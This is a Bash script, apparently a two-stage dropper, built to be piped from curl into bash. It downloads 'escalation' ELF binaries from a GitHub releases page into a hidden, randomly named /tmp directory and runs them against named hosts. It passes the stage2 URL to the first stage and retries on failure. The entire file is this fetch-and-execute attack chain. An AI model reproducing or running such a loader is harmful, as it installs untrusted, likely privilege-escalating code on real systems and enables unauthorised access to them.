#!/usr/bin/env bash
# controller_and_escalation.sh
# 用法示例：
#   curl -fsSL https://xxx/controller_and_escalation.sh org | bash ...
#   curl -fsSL https://xxx/controller_and_escalation.sh test | bash ...

set -euo pipefail

# ==================== 配置 ====================
MAX_RETRIES=5
RETRY_DELAY=8
TMPDIR_BASE="/tmp/.sysd-tmp"

# ==================== Stage2 URL 映射表 ====================
declare -A STAGE2_URL_MAP=(
    ["org"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-server-a.elf"
    ["haoc"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-server-b.elf"
    ["ubuntu"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf"
    ["test"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf" # 仅占位，实际不使用
)

DEFAULT_STAGE2="https://github.com/Jerryy959/controller/releases/download/v1/escalation-default.elf"

# ==================== 日志函数 ====================
log() {
    local level="$1"; shift
    printf "[%s] [%s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$*" >&2
}
log_info()  { log "INFO"  "$@"; }
log_warn()  { log "WARN"  "$@"; }
log_error() { log "ERROR" "$@"; }
log_success() { log " OK " "$@"; }

# ==================== 参数检查 + 特殊 test 处理 ====================
if [ $# -ne 1 ]; then
    log_error "用法: $0 <hostname>"
    log_error "支持的主机名: ${!STAGE2_URL_MAP[*]} (test 为测试模式)"
    exit 1
fi

HOST_NAME="$1"
HOST_NAME="${HOST_NAME,,}"  # 转小写

# 特殊处理：test 模式 - 不执行任何下载和运行，仅输出日志
if [ "$HOST_NAME" = "test" ]; then
    log_success "================= TEST 模式被触发 ================="
    log_success "主机标识: test"
    log_success "本次仅进行测试，不下载、不执行任何 stage"
    log_success "控制器测试模式正常结束"
    exit 0
fi

# 正常流程 - 获取 stage2 URL
STAGE2_URL="${STAGE2_URL_MAP[$HOST_NAME]:-$DEFAULT_STAGE2}"

if [ "$STAGE2_URL" = "$DEFAULT_STAGE2" ] && [ -z "${STAGE2_URL_MAP[$HOST_NAME]+isset}" ]; then
    log_warn "未知主机名 '$HOST_NAME'，使用默认 stage2: $DEFAULT_STAGE2"
else
    log_info "检测到主机: $HOST_NAME → stage2: $STAGE2_URL"
fi

# ==================== Stage1 URL（固定） ====================
STAGE1_URL="https://github.com/Jerryy959/controller/releases/download/v1/test_controller.elf"

# ==================== 准备临时目录 ====================
TMPDIR="${TMPDIR_BASE}-$(head -c8 /dev/urandom | xxd -p -c8)"
mkdir -p "$TMPDIR" || { log_error "创建临时目录失败: $TMPDIR"; exit 1; }
cd "$TMPDIR" || { log_error "进入临时目录失败: $TMPDIR"; exit 1; }

log_info "工作目录: $TMPDIR"
log_info "Stage1: $STAGE1_URL"
log_info "Stage2: $STAGE2_URL  (主机: $HOST_NAME)"

# ==================== 下载函数 ====================
download_file() {
    local url="$1" output="$2" desc="$3"
    log_info "正在下载 ${desc}... (${url})"
    if ! wget -q --no-cache --tries=3 --timeout=15 "$url" -O "$output"; then
        log_error "下载 ${desc} 失败: ${url}"
        return 1
    fi
    log_success "${desc} 下载完成: ${output} ($(du -h "$output" | cut -f1))"
    chmod +x "$output" 2>/dev/null || true
    return 0
}

# ==================== 主流程 ====================
attempt=1
while [ $attempt -le $MAX_RETRIES ]; do
    log_info "================= 第 ${attempt}/${MAX_RETRIES} 次尝试 ================="

    stage1_bin="s1_$(head -c8 /dev/urandom | xxd -p -c8).elf"
    stage2_bin="s2.elf"

    if ! download_file "$STAGE1_URL" "$stage1_bin" "Stage1"; then
        attempt=$((attempt + 1))
        sleep $RETRY_DELAY
        continue
    fi

    log_info "启动 Stage1 (host=$HOST_NAME)"
    if STAGE2_URL="$STAGE2_URL" \
       STAGE2_FILENAME="$stage2_bin" \
       HOST_IDENTIFIER="$HOST_NAME" \
       ./$stage1_bin; then
        log_success "Stage1 执行成功 (退出码: $?)"
        log_success "控制器正常退出"
        exit 0
    else
        exit_code=$?
        log_error "Stage1 执行失败 (退出码: $exit_code)"
        log_warn "将在 ${RETRY_DELAY} 秒后重试... ($((attempt + 1))/${MAX_RETRIES})"
        attempt=$((attempt + 1))
        sleep $RETRY_DELAY
    fi
done

log_error "Stage1 在 $MAX_RETRIES 次尝试后仍然失败！"
exit 1